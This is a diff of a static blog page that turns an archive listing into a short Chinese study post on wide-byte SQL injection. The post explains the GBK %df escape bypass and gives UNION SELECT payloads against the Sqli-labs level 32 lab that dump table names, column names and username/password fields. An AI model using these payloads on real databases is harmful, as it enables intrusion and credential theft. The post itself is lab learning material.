@@ -27,14 +27,12 @@
   <meta name="keywords" content="java,git,springcloud" />
 
 
-<link rel="canonical" href="https://hq185187.github.io/archives/2023/04/page/2/">
+<link rel="canonical" href="https://hq185187.github.io/2023/06/29/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">
 
 
 
   <title>
-2023 年 / 04 月 -
-
-归档 |
+宽字节注入学习 - SQL注入 |
 不良人天藏星 = welcome to my blog = 不良人总舵</title>
 <meta name="generator" content="Hexo 6.3.0"></head>
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -62,9 +60,34 @@
         <div id="brand">
           <div class="pjax">
           
-  <h1 itemprop="name headline">
-      发表于"2023年04月"的文章
+  <h1 itemprop="name headline">宽字节注入学习
   </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2023-06-29 18:06:07">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-06-29T18:06:07+08:00">2023-06-29</time>
+  </span>
+  <span class="item" title="本文字数">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">本文字数</span>
+    <span>803</span>
+    <span class="text">字</span>
+  </span>
+  <span class="item" title="阅读时长">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">阅读时长</span>
+    <span>1 分钟</span>
+  </span>
+</div>
+
 
           </div>
         </div>
@@ -93,14 +116,7 @@
 
       </div>
       <div id="imgs" class="pjax">
-        <ul>
-          <li class="item" data-background-image="https://s2.loli.net/2023/06/06/IuwZ78QAf1D3sao.webp"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/06/06/951AHbfr3jklYQI.png"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/06/06/1t6Tg5lRBYXjubn.webp"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/06/06/Jo7vtPduAl1MSQX.png"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/06/06/BZE9tSe8bRuVmq4.png"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/06/06/VkSD2h7zoXPLAe3.webp"></li>
-        </ul>
+          <img src="/assets/8.jpg">
       </div>
     </header>
     <div id="waves">
@@ -120,81 +136,127 @@
       <div class="inner">
         <div id="main" class="pjax">
           
-  <div class="collapse wrap">
-    <h2 class="item header">
-          <a href="/archives">全部</a> <small>/</small> <a href="/archives/2023">2023 年</a> <small>/</small> 04 月<small>归档</small>
-        
-    </h2>
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/sql/" itemprop="item" rel="index" title="分类于 SQL注入"><span itemprop="name">SQL注入</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
 
-        <article class="item normal" itemscope itemtype="http://schema.org/Article">
-          <div class="meta">
-            <time itemprop="dateCreated"
-                  datetime="2023-04-26T18:30:05+08:00"
-                  content="2023-04-26">
-              04-26
-            </time>
-          </div>
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="https://hq185187.github.io/2023/06/29/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">
 
-          <div class="title">
-              <a href="/2023/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" itemprop="url">
-                <span itemprop="name">文件包含及伪协议的使用</span>
-              </a>
-          </div>
-        </article>
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="hq185187">
+    <meta itemprop="description" content="不良人总舵, 不定时更新web安全相关知识">
+  </span>
 
-        <article class="item normal" itemscope itemtype="http://schema.org/Article">
-          <div class="meta">
-            <time itemprop="dateCreated"
-                  datetime="2023-04-26T00:51:04+08:00"
-                  content="2023-04-26">
-              04-26
-            </time>
-                <span><a href="/categories/NSSCTF/">NSSCTF精选</a></span>
-          </div>
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="welcome to my blog">
+  </span>
 
-          <div class="title">
-              <a href="/2023/04/26/nessctf/" itemprop="url">
-                <span itemprop="name">NSSCTF1</span>
-              </a>
-          </div>
-        </article>
+  <div class="body md" itemprop="articleBody">
+    
 
-        <article class="item normal" itemscope itemtype="http://schema.org/Article">
-          <div class="meta">
-            <time itemprop="dateCreated"
-                  datetime="2023-04-23T23:55:29+08:00"
-                  content="2023-04-23">
-              04-23
-            </time>
-          </div>
+    <h3 id="先介绍几个函数"><a class="markdownIt-Anchor" href="#先介绍几个函数">#</a> 先介绍几个函数</h3>
+<ol>
+<li>addslashes：在预定义字符（单引号，双引号，反斜杠，NULL）前加反斜杠</li>
+<li>mysql_real_escape_string：转义 SQL 语句中使用的字符串中的特殊字符 ( <code>\x00,\n,\r,\,',&quot;,\x1a</code> )</li>
+</ol>
+<h3 id="原理"><a class="markdownIt-Anchor" href="#原理">#</a> 原理</h3>
+<p>窄字节：字符大小为一个一个字节<br>
+宽字节：字符大小为两个字节<br>
+所有英文默认占一个字节，汉字占两个字节<br>
+常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS</p>
+<p>当数据库用 GBK 编码而 PHP 用 UTF-8 编码，当防止 SQL 注入的上面的函数发挥作用，在单双引号前加了反斜杠 <code>\</code> 。假如我们在单双引号前加一个字符，使其和斜杠组合成一个汉字，从而保留单双引号，使其发挥作用。<br>
+注意：<br>
+添加的字符 ASCII 要大于 128，两个字符才能组合成汉字，因为前一个 ascii 码要大于 128，才到汉字的范围 ，这一点需要注意，经典的有 % df</p>
+<p>例子：Sqli-labs32 关<br>
+输入 1‘会被转义成 <code>1\'</code> <br>
+ 输入 1% df’%23 就可以成功回显<br>
+然后就是常规的字符型注入<br>
+爆表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=-1%df&#x27; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure>
+<p>爆列名：（这里表名要用 16 进制）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273%23</span><br></pre></td></tr></table></figure>
+<p>爆字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(username,0x7e,password)from users%23</span><br></pre></td></tr></table></figure>
 
-          <div class="title">
-              <a href="/2023/04/23/hello-world/" itemprop="url">
-                <span itemprop="name">Hello World</span>
-              </a>
-          </div>
-        </article>
   </div>
 
-  
-  <nav class="pagination">
-    <div class="inner">
-    <a class="extend prev" rel="prev" href="/archives/2023/04/"><i class="ic i-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/archives/2023/04/">1</a><span class="page-number current">2</span>
-    </div>
-  </nav>
+   <footer>
 
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-06-29 18:06:50" itemprop="dateModified" datetime="2023-06-29T18:06:50+08:00">2023-06-29</time>
+  </span>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>hq185187 <i class="ic i-at"><em>@</em></i>welcome to my blog
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="https://hq185187.github.io/2023/06/29/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" title="宽字节注入学习">https://hq185187.github.io/2023/06/29/宽字节注入/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/06/29/CRLF/" itemprop="url" rel="prev" data-background-image="&#x2F;assets&#x2F;26.jpg" title="CRLF学习">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>CRLF学习</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
 
 
         </div>
         <div id="sidebar">
           
+
 <div class="inner">
 
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E4%BB%8B%E7%BB%8D%E5%87%A0%E4%B8%AA%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text"> 先介绍几个函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text"> 原理</span></a></li></ol>
       </div>
       <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/2023/04/28/sqli-labs/" rel="bookmark" title="Sqli-labs靶场通关">Sqli-labs靶场通关</a></li><li><a href="/2023/04/29/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87/" rel="bookmark" title="SQL注入绕过">SQL注入绕过</a></li><li><a href="/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" rel="bookmark" title="时间盲注">时间盲注</a></li><li><a href="/2023/06/21/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/" rel="bookmark" title="Mysql主从复制">Mysql主从复制</a></li><li class="active"><a href="/2023/06/29/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" rel="bookmark" title="宽字节注入学习">宽字节注入学习</a></li>
+        </ul>
       </div>
       <div class="overview panel" data-title="站点概览">
         <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -265,7 +327,6 @@
 
   <ul id="quick">
     <li class="prev pjax">
-        <a href="/archives/2023/04/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
     </li>
     <li class="up"><i class="ic i-arrow-up"></i></li>
     <li class="down"><i class="ic i-arrow-down"></i></li>
@@ -274,6 +335,7 @@
     <li class="percent"></li>
   </ul>
 </div>
+
 
         </div>
         <div class="dimmer"></div>
@@ -292,7 +354,7 @@
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/05/10/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="原型链污染">原型链污染</a></span>
+    <span><a href="/2023/06/29/CRLF/" title="CRLF学习">CRLF学习</a></span>
   </li>
 
       
@@ -301,16 +363,7 @@
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" title="正则表达式">正则表达式</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/04/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="命令执行漏洞及绕过方法">命令执行漏洞及绕过方法</a></span>
+    <span><a href="/2023/05/02/SSTI/" title="SSTI总结">SSTI总结</a></span>
   </li>
 
       
@@ -320,27 +373,7 @@
 <a href="/categories/XSS/" title="分类于 XSS">XSS</a>
 </div>
 
-    <span><a href="/2023/06/26/XSS%E5%AD%A6%E4%B9%A0/" title="XSS初学习1">XSS初学习1</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/NSSCTF/" title="分类于 NSSCTF精选">NSSCTF精选</a>
-</div>
-
-    <span><a href="/2023/05/12/nssctf2/" title="NSSCTF2">NSSCTF2</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/NSSCTF/" title="分类于 NSSCTF精选">NSSCTF精选</a>
-</div>
-
-    <span><a href="/2023/04/26/nessctf/" title="NSSCTF1">NSSCTF1</a></span>
+    <span><a href="/2023/06/27/XSS%E5%AD%A6%E4%B9%A02/" title="XSS初学习2">XSS初学习2</a></span>
   </li>
 
       
@@ -359,7 +392,16 @@
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/04/30/SSRF/" title="SSRF绕过">SSRF绕过</a></span>
+    <span><a href="/2023/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" title="正则表达式">正则表达式</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/05/14/LitCTF2023/" title="LitCTF2023">LitCTF2023</a></span>
   </li>
 
       
@@ -377,7 +419,26 @@
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/04/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="php反序列化漏洞学习">php反序列化漏洞学习</a></span>
+    <span><a href="/2023/05/03/request%E5%BA%93/" title="requests学习">requests学习</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/06/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Phar反序列化学习">Phar反序列化学习</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/sql/" title="分类于 SQL注入">SQL注入</a>
+</div>
+
+    <span><a href="/2023/06/29/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" title="宽字节注入学习">宽字节注入学习</a></span>
   </li>
 
   </ul>
@@ -420,7 +481,7 @@
   </div>
 <script data-config type="text/javascript">
   var LOCAL = {
-    path: 'archives/2023/04/page/2/',
+    path: '2023/06/29/宽字节注入/',
     favicon: {
       show: "（●´3｀●）やれやれだぜ",
       hide: "(´Д｀)大変だ！"
